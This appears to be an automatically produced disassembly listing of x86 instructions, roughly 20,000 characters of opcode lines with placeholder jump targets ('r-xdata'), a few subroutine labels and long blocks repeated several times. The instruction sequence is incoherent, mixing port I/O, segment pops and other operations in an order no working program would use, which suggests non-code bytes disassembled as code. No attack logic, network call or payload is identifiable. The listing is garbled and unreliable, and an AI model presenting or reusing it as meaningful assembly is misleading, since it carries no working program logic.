jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
push ebx
0x6249e4eb 0xfa6
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add edi [ esi - 0x4414140e ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x7b
add bh [ edx ]
jpo r-xdata
jpo r-xdata
add eax [ edi ]
cld
jmp r-xdata
fcomp [ 0x27022560 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
add [ esp + edx ] dl
jecxz r-xdata
add ah [ 0x7b141401 ]
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jmp r-xdata
jmp r-xdata
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
sahf
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jpo r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub_46f4d0
adc ebp [ esi + 0x14 ]
add ah [ eax + 0x7b141438 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x30d81360
rcl [ eax ] 0x1
in al 0x6f
add edi [ edi ]
jpo r-xdata
jecxz r-xdata
pushad
adc ebx eax
xor al dl
adc ah ah
outsd
jmp r-xdata
shl [ eax ] 0x1
in al 0x6f
jmp r-xdata
adc al 0x14
shr [ eax ] 0x1
in al 0x6f
jpo r-xdata
push 0x7
sbb bh dh
jmp r-xdata
adc al 0xd0
jpo r-xdata
sub ah ah
jpo r-xdata
outsd
jpo r-xdata
imul ebx
jmp r-xdata
sub ebx 0xffffffeb
jmp r-xdata
loope r-xdata
jmp r-xdata
adc al 0xe4
jmp r-xdata
jpo r-xdata
adc edx esp
jpo r-xdata
insd
mov esp 0xe4141416
pop esp
[ edx + 0x683b2968 ]
in al 0x6c
jpo r-xdata
xor dh bh
jmp r-xdata
jpo r-xdata
and edx [ esi ]
bound edi [ esi - 0x6c7e4ed5 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x42 ]
mov bh 0x2
ror [ edx ] cl
adc al 0x14
jpo r-xdata
sub esi [ ecx + 0x628d9381 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x29be628d ] 0x1426b502
adc al 0x7b
jpo r-xdata
jpo r-xdata
mov ebx 0x66e39e14
scasb [ edi ]
aas
mov ebx 0x10bf6e66
adc al 0x14
mov ebx 0x14046202
dec ecx
bound esp [ esi - 0x573fdf1 ]
jmp r-xdata
jpo r-xdata
sub al 0xb4
mov ch 0xb0
push 0x28229f2e
jpo r-xdata
adc al 0x14
bound edi [ esi + 0xad202b7 ]
lea esp [ edx - 0x42 ]
sub [ edx ] eax
mov ch 0x26
jpo r-xdata
fimul [ esp + edx ]
lea edx [ ebx - 0x16 ]
adc al 0x7b
jpo r-xdata
bound eax [ esp + edx ]
cmpsb [ esi ] [ edi ]
lar ecx [ edx + edi * 8 + 0x7b7bebeb ]
jpo r-xdata
mov esi 0x14169102
adc al 0xbb
adc al 0xbd
jecxz r-xdata
jpo r-xdata
jpo r-xdata
mov esi 0x26b50229
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pushad
xor [ edx ] eax
lodsb [ esi ]
0xebeaa202 0x7beb
adc al 0x14
pushad
sub eax 0x14376f03
adc al 0x2
jne r-xdata
rcr [ 0x2d601414 ] 0x1
jpo r-xdata
pushad
pop es
jpo r-xdata
adc al 0x14
mov ebx 0x1409b702
adc al 0x7b
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
outsd
loope r-xdata
adc al 0x7b
jpo r-xdata
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x14
jmp r-xdata
push edx
stc
sub [ ebx ] edi
jpo r-xdata
jpo r-xdata
mov ch 0xb0
jmp r-xdata
jpo r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
sbb eax 0x2d601414
push 0x6ce4e211
jpo r-xdata
jpo r-xdata
test [ ebp - 0x4ed4419e ] cl
jpo r-xdata
and ch [ eax ]
jpo r-xdata
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
out 0xbd eax
jpo r-xdata
loop r-xdata
jpo r-xdata
jmp r-xdata
call 0xffffffffebc8aff4
adc al 0x7d
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x14
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
insb
jpo r-xdata
in al 0x62
retn 0x1412
adc al 0x14
add ch ah
or dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
adc al 0x83
pop di
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
imul ebx
jmp r-xdata
or [ edi + 0x57be628d ] 0x8d8981b1
bound edi [ esi - 0x7b7e4eab ]
lea esp [ edx - 0x42 ]
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jpo r-xdata
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
mov ebx 0x135f6666
jpo r-xdata
pop ds
0x67e4ebeb 0x3f53
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
outsb
outsb
in al 0x6f
jpo r-xdata
adc edx [ esp + edx ]
pop di
adc al 0x9e
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ebx
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov esp 0x6602ef81
pop es
jpo r-xdata
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db013 ]
mov dh 0x11
or [ eax - 0x25fdcea0 ] 0x7b14140c
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
adc al 0x14
bound ebp [ esi - 0x3fd4cc9 ]
adc al 0x14
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
add bl dl
or al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
push ebx
0x6249e4eb 0xfa6
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add edi [ esi - 0x4414140e ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x7b
add bh [ edx ]
jpo r-xdata
jpo r-xdata
add eax [ edi ]
cld
jmp r-xdata
fcomp [ 0x27022560 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
add [ esp + edx ] dl
jecxz r-xdata
add ah [ 0x7b141401 ]
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jmp r-xdata
jmp r-xdata
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
sahf
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jpo r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub_46f600
push es
adc al 0x14
fimul [ esp + edx ]
lea edx [ ebx - 0x16 ]
jmp r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
mov ebx 0x66e39e14
scasb [ edi ]
aas
mov ebx 0x10bf6e66
adc al 0x14
mov ebx 0x14046202
adc al 0x7b
jpo r-xdata
adc al 0x7b
jpo r-xdata
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
out 0xbd eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x14
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x83
pop di
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jpo r-xdata
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
mov ebx 0x135f6666
jpo r-xdata
pop ds
0x67e4ebeb 0x3f53
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
outsb
outsb
in al 0x6f
jpo r-xdata
adc edx [ esp + edx ]
pop di
adc al 0x9e
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ebx
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov esp 0x6602ef81
pop es
jpo r-xdata
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db013 ]
mov dh 0x11
or [ eax - 0x25fdcea0 ] 0x7b14140c
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
adc al 0x14
bound ebp [ esi - 0x3fd4cc9 ]
adc al 0x14
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
add bl dl
or al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
rcr [ 0x2d601414 ] 0x1
push ebx
0x6249e4eb 0xfa6
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add edi [ esi - 0x4414140e ]
jpo r-xdata
jmp r-xdata
push edx
stc
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
adc al 0x14
jpo r-xdata
sbb eax 0x2d601414
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x7b
add bh [ edx ]
jpo r-xdata
jpo r-xdata
add eax [ edi ]
cld
jmp r-xdata
fcomp [ 0x27022560 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
add [ esp + edx ] dl
jecxz r-xdata
add ah [ 0x7b141401 ]
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jmp r-xdata
jmp r-xdata
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
sahf
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jpo r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub_46f64b
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x5a ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
cmpsb [ esi ] [ edi ]
jpo r-xdata
adc al 0x14
cmp dh [ edx ]
jpo r-xdata
add [ esp + edx ] dl
pushad
and eax [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dh ch
adc al 0x9e
jecxz r-xdata
add bh [ edx ]
jpo r-xdata
jpo r-xdata
adc al 0x7b
add eax [ edi ]
cld
jmp r-xdata
jpo r-xdata
outsb
adc al 0x7b
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
and dl [ esp + edx ]
jpo r-xdata
0x67e4ebeb 0x3f53
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x7b
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
pushad
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebp 0x2c8a9ca6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
add ah [ 0x7b141401 ]
jmp r-xdata
jpo r-xdata
sub eax 0x14012502
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x2 eax
dec esi
call 0xffffffffbec2e2d7
push ebx
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
outsb
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
out 0xbd eax
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
and ch [ esi + 0x2b ]
in al 0x72
sub ah [ eax + 0x2a ]
add bl [ ecx + 0x4 ]
adc al 0x14
and eax 0x7b141401
fsub [ edx ]
outsb
sub esp esp
jb r-xdata
jpo r-xdata
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x4a ]
adc esi [ eax + 0x11b6628d ]
sub al 0xae
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x14
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
pushad
sub al [ edx ]
pop ecx
add al 0x14
adc al 0x7b
add bh [ edx ]
xor dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
jpo r-xdata
jpo r-xdata
adc al 0x83
pop di
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xchg edi eax
push ss
adc al 0x14
mov ebx 0x141de102
adc al 0x7b
pushad
adc cl [ ebp + 0x601f9662 ]
adc eax 0x1d96628d
pushad
adc ecx [ ebp - 0x7eec699e ]
mov ebp 0x1433ef02
adc al 0x7b
jpo r-xdata
outsb
cmc
bound esp [ esi + 0x223601d ]
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
outsd
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
cmpsb [ esi ] [ edi ]
and ebx 0xffffff83
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x22a002b8
adc al 0x14
jpo r-xdata
in al 0x5d
in al dx
add ah [ edi + 0x7b141431 ]
jecxz r-xdata
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
add edi [ esi - 0x4414140e ]
jpo r-xdata
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
add [ esi ] 0x10
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
mov ebx 0x135f6666
jpo r-xdata
pop ds
jpo r-xdata
and [ edx - 0x38 ] 0x14
pop esp
das
jmp r-xdata
outsb
in al 0x6f
jpo r-xdata
jpo r-xdata
adc al 0x14
